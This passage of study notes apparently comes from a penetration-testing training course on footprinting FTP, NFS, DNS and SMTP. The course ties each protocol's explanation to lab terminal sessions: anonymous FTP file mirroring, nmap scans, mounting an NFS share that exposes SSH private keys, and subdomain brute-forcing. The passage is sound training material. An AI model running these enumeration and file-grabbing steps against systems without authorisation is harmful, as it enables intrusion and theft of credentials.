  A distinction is made between <code class="language-plaintext highlighter-rouge">active</code> and <code class="language-plaintext highlighter-rouge">passive</code> FTP. In the active variant, the client establishes the connection as described via TCP port 21 However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the <code class="language-plaintext highlighter-rouge">passive mode</code> has been developed.</p>

<h3 id="tftp-1">TFTP</h3>

<p><code class="language-plaintext highlighter-rouge">Trivial File Transfer Protocol</code> (<code class="language-plaintext highlighter-rouge">TFTP</code>) is simpler than FTP and performs file transfers between client and server processes. However, it <code class="language-plaintext highlighter-rouge">does not</code> provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses <code class="language-plaintext highlighter-rouge">UDP</code>, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.</p>

<p>This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user’s authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.</p>

<p>FTP</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>ftp 10.129.14.136

Connected to 10.129.14.136.
220 <span class="s2">"Welcome  vsFTP service."</span>
Name <span class="o">(</span>10.129.14.136:cry0l1t3<span class="o">)</span>: anonymous

230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.


ftp&gt; <span class="nb">ls

</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
<span class="nt">-rw-rw-r--</span>    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
<span class="nt">-rw-rw-r--</span>    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.

</code></pre></div></div>

<p>Download All ftp Available Files:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>wget <span class="nt">-m</span> <span class="nt">--no-passive</span> ftp://anonymous:anonymous@10.129.14.136

<span class="nt">--2021-09-19</span> 14:45:58--  ftp://anonymous:<span class="k">*</span>password<span class="k">*</span>@10.129.14.136/                                         
           <span class="o">=&gt;</span> ‘10.129.14.136/.listing’                                                                     
Connecting to 10.129.14.136:21... connected.                                                               
Logging <span class="k">in </span>as anonymous ... Logged <span class="k">in</span><span class="o">!</span>
<span class="o">==&gt;</span> SYST ... <span class="k">done</span><span class="nb">.</span>    <span class="o">==&gt;</span> PWD ... <span class="k">done</span><span class="nb">.</span>
<span class="o">==&gt;</span> TYPE I ... <span class="k">done</span><span class="nb">.</span>  <span class="o">==&gt;</span> CWD not needed.
<span class="o">==&gt;</span> PORT ... <span class="k">done</span><span class="nb">.</span>    <span class="o">==&gt;</span> LIST ... <span class="k">done</span><span class="nb">.</span>                                                                 
12.12.1.136/.listing           <span class="o">[</span> &lt;<span class="o">=&gt;</span>                                  <span class="o">]</span>     466  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s       
                                                                                                         
2021-09-19 14:45:58 <span class="o">(</span>65,8 MB/s<span class="o">)</span> - ‘10.129.14.136/.listing’ saved <span class="o">[</span>466]                                     
<span class="nt">--2021-09-19</span> 14:45:58--  ftp://anonymous:<span class="k">*</span>password<span class="k">*</span>@10.129.14.136/Calendar.pptx   
           <span class="o">=&gt;</span> ‘10.129.14.136/Calendar.pptx’                                       
<span class="o">==&gt;</span> CWD not required.                                                           
<span class="o">==&gt;</span> SIZE Calendar.pptx ... <span class="k">done</span><span class="nb">.</span>                                                                                                                            
<span class="o">==&gt;</span> PORT ... <span class="k">done</span><span class="nb">.</span>    <span class="o">==&gt;</span> RETR Calendar.pptx ... <span class="k">done</span><span class="nb">.</span>       

...SNIP...

2021-09-19 14:45:58 <span class="o">(</span>48,3 MB/s<span class="o">)</span> - ‘10.129.14.136/Employees/.listing’ saved <span class="o">[</span>119]

FINISHED <span class="nt">--2021-09-19</span> 14:45:58--
Total wall clock <span class="nb">time</span>: 0,03s
Downloaded: 15 files, 1,7K <span class="k">in </span>0,001s <span class="o">(</span>3,02 MB/s<span class="o">)</span>
</code></pre></div></div>

<h1 id="nfs">NFS</h1>

<p>#nfs #nfs-mount</p>

<p><code class="language-plaintext highlighter-rouge">Network File System</code> (<code class="language-plaintext highlighter-rouge">NFS</code>) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. <a href="https://en.wikipedia.org/wiki/Network_File_System">NFS</a> is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (<code class="language-plaintext highlighter-rouge">NFSv3</code>), which has been in use for many years, authenticates the client computer, this changes with <code class="language-plaintext highlighter-rouge">NFSv4</code>. Here, as with the Windows SMB protocol, the user must authenticate.</p>

<table>
  <thead>
    <tr>
      <th><strong>Version</strong></th>
      <th><strong>Features</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">NFSv2</code></td>
      <td>It is older but is supported by many systems and was initially operated entirely over UDP.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">NFSv3</code></td>
      <td>It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">NFSv4</code></td>
      <td>It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.</td>
    </tr>
  </tbody>
</table>

<p>NFS version 4.1 (<a href="https://datatracker.ietf.org/doc/html/rfc8881">RFC 8881</a>) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port <code class="language-plaintext highlighter-rouge">2049</code> is used to run the service, which simplifies the use of the protocol across firewalls.</p>

<p>NFS is based on the <a href="https://en.wikipedia.org/wiki/Sun_RPC">Open Network Computing Remote Procedure Call</a> (<code class="language-plaintext highlighter-rouge">ONC-RPC</code>/<code class="language-plaintext highlighter-rouge">SUN-RPC</code>) protocol exposed on <code class="language-plaintext highlighter-rouge">TCP</code> and <code class="language-plaintext highlighter-rouge">UDP</code> ports <code class="language-plaintext highlighter-rouge">111</code>, which uses <a href="https://en.wikipedia.org/wiki/External_Data_Representation">External Data Representation</a> (<code class="language-plaintext highlighter-rouge">XDR</code>) for the system-independent exchange of data. The NFS protocol has <code class="language-plaintext highlighter-rouge">no</code> mechanism for <code class="language-plaintext highlighter-rouge">authentication</code> or <code class="language-plaintext highlighter-rouge">authorization</code>. Instead, authentication is completely shifted to the RPC protocol’s options. The authorization is derived from the available file system information. In this process, the server is responsible for translating the client’s user information into the file system’s format and converting the corresponding authorization details into the required UNIX syntax as accurately as possible.</p>

<p>The most common authentication is via UNIX <code class="language-plaintext highlighter-rouge">UID</code>/<code class="language-plaintext highlighter-rouge">GID</code> and <code class="language-plaintext highlighter-rouge">group memberships</code>, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.</p>

<h2 id="dangerous-settings-1">Dangerous Settings</h2>

<p>However, even with NFS, some settings can be dangerous for the company and its infrastructure. Here are some of them listed:</p>

<table>
  <thead>
    <tr>
      <th><strong>Option</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rw</code></td>
      <td>Read and write permissions.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">insecure</code></td>
      <td>Ports above 1024 will be used.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">nohide</code></td>
      <td>If another file system was mounted below an exported directory, this directory is exported by its own exports entry.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">no_root_squash</code></td>
      <td>All files created by root are kept with the UID/GID 0.</td>
    </tr>
  </tbody>
</table>

<p>It is highly recommended to create a local VM and experiment with the settings. We will discover methods that will show us how the NFS server is configured. For this, we can create several folders and assign different options to each one. Then we can inspect them and see what settings can have what effect on the NFS share and its permissions and the enumeration process.</p>

<p>We can take a look at the <code class="language-plaintext highlighter-rouge">insecure</code> option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.</p>

<p>Footprint:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap 10.129.14.128 <span class="nt">-p111</span>,2049 <span class="nt">-sV</span> <span class="nt">-sC</span>

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-19 17:12 CEST
Nmap scan report <span class="k">for </span>10.129.14.128
Host is up <span class="o">(</span>0.00018s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 <span class="o">(</span>RPC <span class="c">#100227)</span>
MAC Address: 00:00:00:00:00:00 <span class="o">(</span>VMware<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>6.58 seconds
</code></pre></div></div>

<h2 id="mounting-nfs">Mounting nfs</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>mount <span class="nt">-t</span> nfs 10.129.14.128:/ /mnt <span class="nt">-o</span> nolock
c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">cd </span>target-NFS
c0derpwner@htb[/htb]<span class="nv">$ </span>tree <span class="nb">.</span>

<span class="nb">.</span>
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
</code></pre></div></div>

<h1 id="dns">DNS</h1>

<hr />

<p><code class="language-plaintext highlighter-rouge">Domain Name System</code> (<code class="language-plaintext highlighter-rouge">DNS</code>) is an integral part of the Internet. For example, through domain names, such as <code class="language-plaintext highlighter-rouge">lol.example.com</code> or <strong><code class="language-plaintext highlighter-rouge">www.example.com</code></strong>, we can reach the web servers that the hosting provider has assigned one or more specific IP addresses. DNS is a system for resolving computer names into IP addresses, and it does not have a central database. Simplified, we can imagine it like a library with many different phone books. The information is distributed over many thousands of name servers. Globally distributed DNS servers translate domain names into IP addresses and thus control which server a user can reach via a particular domain. There are several types of DNS servers that are used worldwide:</p>

<ul>
  <li>DNS root server</li>
  <li>Authoritative name server</li>
  <li>Non-authoritative name server</li>
  <li>Caching server</li>
  <li>Forwarding server</li>
  <li>Resolver</li>
</ul>

<table>
  <thead>
    <tr>
      <th><strong>Server Type</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">DNS Root Server</code></td>
      <td>The root servers of the DNS are responsible for the top-level domains (<code class="language-plaintext highlighter-rouge">TLD</code>). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The <a href="https://www.icann.org/">Internet Corporation for Assigned Names and Numbers</a> (<code class="language-plaintext highlighter-rouge">ICANN</code>) coordinates the work of the root name servers. There are <code class="language-plaintext highlighter-rouge">13</code> such root servers around the globe.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Authoritative Nameserver</code></td>
      <td>Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client’s query, the root name server takes over at that point.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Non-authoritative Nameserver</code></td>
      <td>Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Caching DNS Server</code></td>
      <td>Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Forwarding Server</code></td>
      <td>Forwarding servers perform only one function: they forward DNS queries to another DNS server.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Resolver</code></td>
      <td>Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.</td>
    </tr>
  </tbody>
</table>

<p>DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply <code class="language-plaintext highlighter-rouge">DNS over TLS</code> (<code class="language-plaintext highlighter-rouge">DoT</code>) or <code class="language-plaintext highlighter-rouge">DNS over HTTPS</code> (<code class="language-plaintext highlighter-rouge">DoH</code>) here. In addition, the network protocol <code class="language-plaintext highlighter-rouge">DNSCrypt</code> also encrypts the traffic between the computer and the name server.</p>

<p>However, the DNS does not only link computer names and IP addresses. It also stores and outputs additional information about the services associated with a domain. A DNS query can therefore also be used, for example, to determine which computer serves as the e-mail server for the domain in question or what the domain’s name servers are called.</p>

<p>Different <code class="language-plaintext highlighter-rouge">DNS records</code> are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.</p>

<table>
  <thead>
    <tr>
      <th><strong>DNS Record</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">A</code></td>
      <td>Returns an IPv4 address of the requested domain as a result.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">AAAA</code></td>
      <td>Returns an IPv6 address of the requested domain.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">MX</code></td>
      <td>Returns the responsible mail servers as a result.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">NS</code></td>
      <td>Returns the DNS servers (nameservers) of the domain.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">TXT</code></td>
      <td>This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">CNAME</code></td>
      <td>This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">PTR</code></td>
      <td>The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">SOA</code></td>
      <td>Provides information about the corresponding DNS zone and email address of the administrative contact.</td>
    </tr>
  </tbody>
</table>

<p>The <code class="language-plaintext highlighter-rouge">SOA</code> record is located in a domain’s zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>dig soa www.inlanefreight.com

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.27-Debian &lt;&lt;<span class="o">&gt;&gt;</span> soa www.inlanefreight.com
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 15876
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.inlanefreight.com.         IN      SOA

;; AUTHORITY SECTION:
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400

;; Query time: 16 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Thu Jan 05 12:56:10 GMT 2023
;; MSG SIZE  rcvd: 128
</span></code></pre></div></div>

<p>The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is <code class="language-plaintext highlighter-rouge">awsdns-hostmaster@amazon.com</code>.</p>

<p>For the IP address to be resolved from the <code class="language-plaintext highlighter-rouge">Fully Qualified Domain Name</code> (<code class="language-plaintext highlighter-rouge">FQDN</code>), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a <code class="language-plaintext highlighter-rouge">PTR</code> record. The <strong>PTR</strong> records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.</p>

<p>dangerous settings</p>

<table>
  <thead>
    <tr>
      <th><strong>Option</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">allow-query</code></td>
      <td>Defines which hosts are allowed to send requests to the DNS server.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">allow-recursion</code></td>
      <td>Defines which hosts are allowed to send recursive requests to the DNS server.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">allow-transfer</code></td>
      <td>Defines which hosts are allowed to receive zone transfers from the DNS server.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">zone-statistics</code></td>
      <td>Collects statistical data of zones.</td>
    </tr>
  </tbody>
</table>

<p>![[dns_resolver.png]]</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>dig any inlanefreight.htb @10.129.14.128

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.1-Ubuntu &lt;&lt;<span class="o">&gt;&gt;</span> any inlanefreight.htb @10.129.14.128
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 7649
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      ANY

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:42:13 CEST 2021
;; MSG SIZE  rcvd: 437
</span></code></pre></div></div>

<h4 id="subdomain-brute-forcing">Subdomain Brute Forcing</h4>

<p>DNS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="k">for </span>sub <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt<span class="si">)</span><span class="p">;</span><span class="k">do </span>dig <span class="nv">$sub</span>.inlanefreight.htb @10.129.14.128 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">';\|SOA'</span> | <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span> | <span class="nb">grep</span> <span class="nv">$sub</span> | <span class="nb">tee</span> <span class="nt">-a</span> subdomains.txt<span class="p">;</span><span class="k">done

</span>ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
</code></pre></div></div>

<p>Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example <a href="https://github.com/fwaeytens/dnsenum">DNSenum</a>.</p>

<p>DNS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>dnsenum <span class="nt">--dnsserver</span> 10.129.14.128 <span class="nt">--enum</span> <span class="nt">-p</span> 0 <span class="nt">-s</span> 0 <span class="nt">-o</span> subdomains.txt <span class="nt">-f</span> /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb

dnsenum VERSION:1.2.6

<span class="nt">-----</span>   inlanefreight.htb   <span class="nt">-----</span>


Host<span class="s1">'s addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1.

Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...
AXFR record query failed: no nameservers


Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
_______________________________________________________________________________________________________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136
mail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201
app.inlanefreight.htb.                   604800   IN    A        10.129.18.15
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

...SNIP...
done.
</span></code></pre></div></div>

<p>also ffuf -with -H ‘Host: FUZZ.example.com’ is good</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 dnsenum <span class="nt">--dnsserver</span> 10.129.11.211 <span class="nt">--enum</span> <span class="nt">-p</span> 0 <span class="nt">-s</span> 0 <span class="nt">-o</span> subs  -f /opt/SecLists/Discovery/DN  
S/fierce-hostlist.txt dev.inlanefreight.htb    
dnsenum VERSION:1.3.1  
  
<span class="nt">-----</span>   dev.inlanefreight.htb   -----  
  
  
Host<span class="s1">'s addresses:  
__________________  
  
  
  
Name Servers:  
______________  
  
ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1  
  
  
Mail (MX) Servers:  
___________________  
  
  
  
Trying Zone Transfers and getting Bind Versions:  
_________________________________________________  
  
unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.  
  
Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ...    
AXFR record query failed: no nameservers  
  
  
Brute forcing with /home/nullbyte/SecLists/Discovery/DNS/fierce-hostlist.txt:  
______________________________________________________________________________  
  
dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6  
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1  
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203  
  
  
Launching Whois Queries:  
_________________________  
  
  
  
dev.inlanefreight.htb_____________________  
  
  
  
Performing reverse lookup on 0 ip addresses:  
_____________________________________________  
  
  
0 results out of 0 IP addresses.  
  
  
dev.inlanefreight.htb ip blocks:  
_________________________________  
  
  
done.
</span></code></pre></div></div>
<hr />

<h1 id="smtp">SMTP</h1>

<p>The <code class="language-plaintext highlighter-rouge">Simple Mail Transfer Protocol</code> (<code class="language-plaintext highlighter-rouge">SMTP</code>) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.</p>

<p>By default, SMTP servers accept connection requests on port <code class="language-plaintext highlighter-rouge">25</code>. However, newer SMTP servers also use other ports such as TCP port <code class="language-plaintext highlighter-rouge">587</code>. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network.</p>

<p>SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port <code class="language-plaintext highlighter-rouge">25</code> for the encrypted connection, for example, TCP port <code class="language-plaintext highlighter-rouge">465</code>.</p>

<p>An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as <code class="language-plaintext highlighter-rouge">Mail User Agent</code> (<code class="language-plaintext highlighter-rouge">MUA</code>), converts it into a header and a body and uploads both to the SMTP server. This has a so-called <code class="language-plaintext highlighter-rouge">Mail Transfer Agent</code> (<code class="language-plaintext highlighter-rouge">MTA</code>), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a <code class="language-plaintext highlighter-rouge">Mail Submission Agent</code> (<code class="language-plaintext highlighter-rouge">MSA</code>), which checks the validity, i.e., the origin of the e-mail. This <code class="language-plaintext highlighter-rouge">MSA</code> is also called <code class="language-plaintext highlighter-rouge">Relay</code> server. These are very important later on, as the so-called <code class="language-plaintext highlighter-rouge">Open Relay Attack</code> can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.</p>

<p>|Client (<code class="language-plaintext highlighter-rouge">MUA</code>)|<code class="language-plaintext highlighter-rouge">➞</code>|Submission Agent (<code class="language-plaintext highlighter-rouge">MSA</code>)|<code class="language-plaintext highlighter-rouge">➞</code>|Open Relay (<code class="language-plaintext highlighter-rouge">MTA</code>)|<code class="language-plaintext highlighter-rouge">➞</code>|Mail Delivery Agent (<code class="language-plaintext highlighter-rouge">MDA</code>)|<code class="language-plaintext highlighter-rouge">➞</code>|Mailbox (<code class="language-plaintext highlighter-rouge">POP3</code>/<code class="language-plaintext highlighter-rouge">IMAP</code>)|
|—|—|—|—|—|—|—|—|—|</p>

<p>Suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol <a href="http://dkim.org/">DomainKeys</a> (<code class="language-plaintext highlighter-rouge">DKIM</code>), the <a href="https://dmarcian.com/what-is-spf/">Sender Policy Framework</a> (<code class="language-plaintext highlighter-rouge">SPF</code>).</p>

<p>The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.</p>

<table>
  <thead>
    <tr>
      <th><strong>Command</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">AUTH PLAIN</code></td>
      <td>AUTH is a service extension used to authenticate the client.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">HELO</code></td>
      <td>The client logs in with its computer name and thus starts the session.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">MAIL FROM</code></td>
      <td>The client names the email sender.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">RCPT TO</code></td>
      <td>The client names the email recipient.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">DATA</code></td>
      <td>The client initiates the transmission of the email.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">RSET</code></td>
      <td>The client aborts the initiated transmission but keeps the connection between client and server.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">VRFY</code></td>
      <td>The client checks if a mailbox is available for message transfer.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">EXPN</code></td>
      <td>The client also checks if a mailbox is available for messaging with this command.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">NOOP</code></td>
      <td>The client requests a response from the server to prevent disconnection due to time-out.</td>
    </tr>
